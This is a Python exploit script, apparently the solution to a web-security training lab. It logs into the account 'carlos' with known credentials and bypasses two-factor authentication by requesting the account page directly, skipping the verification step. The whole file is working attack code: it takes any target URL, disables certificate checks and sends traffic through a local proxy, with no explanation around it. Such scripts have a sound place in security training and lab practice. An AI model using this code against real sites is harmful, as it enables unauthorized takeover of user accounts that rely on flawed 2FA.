import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def access_carlos_account(url):

    session = requests.session()
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    print("(+) Logging into carlos's account and bypassing 2FA verification...")

    # Log into carlos's account
    res1 = session.post(login_url, data=login_data, verify=False, proxies=proxies, allow_redirects=False)

    # Confirm bypass
    myaccount_url = url + "/my-account"
    res2 = session.get(myaccount_url, verify=False, proxies=proxies)

    if "carlos" in res2.text:
        print("(+) Successfully bypassed 2FA verification.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://example.com")
        sys.exit(-1)

    url = sys.argv[1]
    access_carlos_account(url)

        

if __name__ == "__main__":
    main()